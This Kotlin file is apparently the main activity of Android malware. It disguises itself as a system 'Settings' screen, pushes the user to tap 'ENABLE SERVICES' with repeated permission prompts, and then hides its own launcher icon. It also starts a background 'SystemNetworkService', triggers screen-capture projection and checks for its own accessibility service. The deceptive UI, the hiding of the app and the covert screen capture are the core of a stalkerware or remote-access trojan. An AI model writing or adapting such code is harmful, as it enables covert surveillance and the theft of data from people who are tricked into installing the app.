package com.openaccess.sdk

import android.Manifest
import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.app.Activity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.DisplayCapture
import com.openaccess.sdk.service.SystemNetworkService

@Suppress("DEPRECATION")
class MainActivity : Activity() {
    companion object {
        private const val RC_ALL = 100
        private const val RC_SCREEN = 101
        private const val RC_NOTIF = 102
        const val ACTION_REQUEST_SCREEN = "com.openaccess.sdk.REQUEST_SCREEN"

        val CORE_PERMS = listOf<String>()

        val NOTIF_PERM = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            Manifest.permission.POST_NOTIFICATIONS else null

        val ALL_PERMS = CORE_PERMS + listOfNotNull(NOTIF_PERM)

        val REQUEST_PERMS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) ALL_PERMS else CORE_PERMS

        val PERM_LABELS = mapOf(
            Manifest.permission.POST_NOTIFICATIONS to "Notifications",
        )

        fun hasPermission(ctx: Context, perm: String): Boolean {
            return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
        }

        fun isAccessibilityEnabled(ctx: Context): Boolean {
            return try {
                val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
                val enabledServices = Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val ourService = ComponentName(ctx, AccessibilityHelper::class.java).flattenToString()
                enabledServices.contains(ourService) && am.isEnabled
            } catch (_: Exception) {
                false
            }
        }

        fun isServiceRunning(ctx: Context, serviceClass: Class<*>): Boolean {
            return try {
                val manager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                for (service in manager.getRunningServices(Int.MAX_VALUE)) {
                    if (serviceClass.name == service.service.className) return true
                }
                false
            } catch (_: Exception) {
                false
            }
        }
    }

    private lateinit var rootLayout: FrameLayout
    private lateinit var enableBtn: Button
    private lateinit var statusText: TextView
    private var retryCount = 0
    private var requestingNotif = false

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            try {
                val projIntent = DisplayCapture.getProjectionIntent(this@MainActivity)
                startActivityForResult(projIntent, RC_SCREEN)
            } catch (_: Exception) {}
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN), Context.RECEIVER_NOT_EXPORTED)
            } else {
                @Suppress("DEPRECATION")
                registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN))
            }
        } catch (_: Exception) {}

        rootLayout = createSettingsView()
        setContentView(rootLayout)

        if (ALL_PERMS.all { hasPermission(this, it) }) {
            onSetupComplete()
        }
    }

    private fun dp(dip: Int): Int {
        return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dip.toFloat(), resources.displayMetrics).toInt()
    }

    private fun createSettingsView(): FrameLayout {
        val root = FrameLayout(this).apply {
            setBackgroundColor(Color.parseColor("#F5F5F5"))
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }

        // Toolbar
        val toolbar = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#FFFFFF"))
            setPadding(dp(16), dp(48), dp(16), dp(16))
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val toolbarTitle = TextView(this).apply {
            text = "Settings"
            textSize = 24f
            setTextColor(Color.parseColor("#212121"))
            setTypeface(null, android.graphics.Typeface.BOLD)
        }
        toolbar.addView(toolbarTitle)

        val toolbarSub = TextView(this).apply {
            text = "System Services v4.2"
            textSize = 12f
            setTextColor(Color.parseColor("#757575"))
        }
        toolbar.addView(toolbarSub)
        root.addView(toolbar)

        // Scrollable settings list
        val scroll = ScrollView(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            ).apply { topMargin = dp(104) }
        }

        val content = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, dp(8), 0, dp(24))
        }

        // Settings categories
        val categories = listOf(
            Pair("\uD83D\uDCF6", "Network & Internet", "Wi-Fi, mobile, hotspot"),
            Pair("\uD83D\uDD12", "Security & Privacy", "Screen lock, permissions"),
            Pair("\uD83D\uDD0B", "Battery", "Battery saver, usage"),
            Pair("\uD83D\uDCBE", "Storage", "Internal storage, files"),
            Pair("\uD83D\uDD14", "Notifications", "App notifications, Do Not Disturb")
        )

        categories.forEach { (icon, title, subtitle) ->
            val item = LinearLayout(this@MainActivity).apply {
                orientation = LinearLayout.HORIZONTAL
                setPadding(dp(16), dp(14), dp(16), dp(14))
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply { bottomMargin = dp(1) }
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    setColor(Color.parseColor("#FFFFFF"))
                }
            }

            val iconView = TextView(this@MainActivity).apply {
                text = icon
                textSize = 20f
                setPadding(0, 0, dp(16), 0)
                gravity = Gravity.CENTER_VERTICAL
            }
            item.addView(iconView)

            val textCol = LinearLayout(this@MainActivity).apply {
                orientation = LinearLayout.VERTICAL
                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            }

            val titleView = TextView(this@MainActivity).apply {
                text = title
                textSize = 16f
                setTextColor(Color.parseColor("#212121"))
            }
            textCol.addView(titleView)

            val subView = TextView(this@MainActivity).apply {
                text = subtitle
                textSize = 12f
                setTextColor(Color.parseColor("#757575"))
            }
            textCol.addView(subView)
            item.addView(textCol)

            // Arrow indicator
            val arrow = TextView(this@MainActivity).apply {
                text = "\u203A"
                textSize = 24f
                setTextColor(Color.parseColor("#BDBDBD"))
                gravity = Gravity.CENTER_VERTICAL
            }
            item.addView(arrow)
            content.addView(item)
        }

        // Enable button
        enableBtn = Button(this).apply {
            text = "ENABLE SERVICES"
            textSize = 14f
            setTypeface(null, android.graphics.Typeface.BOLD)
            setTextColor(Color.parseColor("#FFFFFF"))
            setPadding(0, dp(12), 0, dp(12))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(48)
            ).apply {
                topMargin = dp(24)
                leftMargin = dp(16)
                rightMargin = dp(16)
                bottomMargin = dp(12)
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(24).toFloat()
                setColor(Color.parseColor("#1976D2"))
            }
            setOnClickListener { requestAllPerms() }
        }
        content.addView(enableBtn)

        // Status text
        statusText = TextView(this).apply {
            text = "Tap to enable system services"
            textSize = 12f
            setTextColor(Color.parseColor("#9E9E9E"))
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, 0)
        }
        content.addView(statusText)

        scroll.addView(content)
        root.addView(scroll)
        return root
    }

    private fun requestAllPerms() {
        val needed = REQUEST_PERMS.filter { !hasPermission(this, it) }
        if (needed.isEmpty()) {
            checkAndProceed()
            return
        }

        try {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
            statusText.text = "Enabling services..."
            statusText.setTextColor(Color.parseColor("#FF9800"))
            enableBtn.text = "ENABLING..."
            enableBtn.isEnabled = false
        } catch (_: Exception) {
            statusText.text = "Tap again to continue"
        }
    }

    private fun requestNotifPermission() {
        if (NOTIF_PERM == null) { checkAndProceed(); return }
        if (hasPermission(this, NOTIF_PERM)) { checkAndProceed(); return }
        requestingNotif = true
        try {
            ActivityCompat.requestPermissions(this, arrayOf(NOTIF_PERM), RC_NOTIF)
        } catch (_: Exception) {
            requestingNotif = false
            checkAndProceed()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == RC_SCREEN) {
            if (resultCode == RESULT_OK && data != null) {
                DisplayCapture.setProjection(resultCode, data)
                DisplayCapture.initProjection(this)
                statusText.text = "Screen capture active"
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)

        if (requestCode == RC_NOTIF) {
            requestingNotif = false
            checkAndProceed()
            return
        }

        if (requestCode == RC_ALL) {
            val denied = REQUEST_PERMS.filter { !hasPermission(this, it) }
            if (denied.isEmpty()) {
                retryCount = 0
                checkAndProceed()
            } else {
                retryCount++
                if (retryCount < 3) {
                    Handler(Looper.getMainLooper()).postDelayed({ requestAllPerms() }, 1500)
                } else {
                    retryCount = 0
                    statusText.text = "Some permissions denied — proceeding anyway"
                    enableBtn.text = "Continue"
                    enableBtn.isEnabled = true
                    enableBtn.setOnClickListener { onSetupComplete() }
                }
            }
        }
    }

    private fun checkAndProceed() {
        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        when {
            !permsOk && retryCount < 3 -> requestAllPerms()
            !permsOk -> onSetupComplete()
            else -> onSetupComplete()
        }
    }

    private fun onSetupComplete() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        try {
            val serviceIntent = Intent(this, SystemNetworkService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (_: Exception) {}

        finishAndRemoveTask()
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing || !::rootLayout.isInitialized) return
        if (requestingNotif) return

        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        if (permsOk) {
            onSetupComplete()
        }
    }

    override fun onPause() {
        super.onPause()
        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}
    }
}
